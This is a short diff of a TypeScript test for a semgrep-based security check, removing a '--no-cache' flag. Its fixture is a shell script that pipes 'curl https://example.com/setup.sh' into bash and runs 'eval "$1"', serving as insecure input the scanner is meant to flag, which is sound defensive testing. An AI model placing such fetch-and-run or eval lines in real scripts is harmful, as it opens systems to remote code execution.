@@ -15,7 +15,7 @@ if (toolShipsHere('semgrep'))
         const source = '#!/usr/bin/env bash\ncurl https://example.com/setup.sh | bash\neval "$1"\n';
         await createFileTree(sandbox.path, { 'gspot.toml': policy, 'script.sh': source });
         await installSemgrep(sandbox.path);
-        const command = ['check', '--only', 'security/semgrep', '--no-cache', '--json'];
+        const command = ['check', '--only', 'security/semgrep', '--json'];
         const broken = await run(sandbox.path, command);
         expect(broken.code, broken.stdout + broken.stderr).toBe(1);
         const findings = (JSON.parse(broken.stdout) as RunReport).checks.flatMap((check) => check.findings);
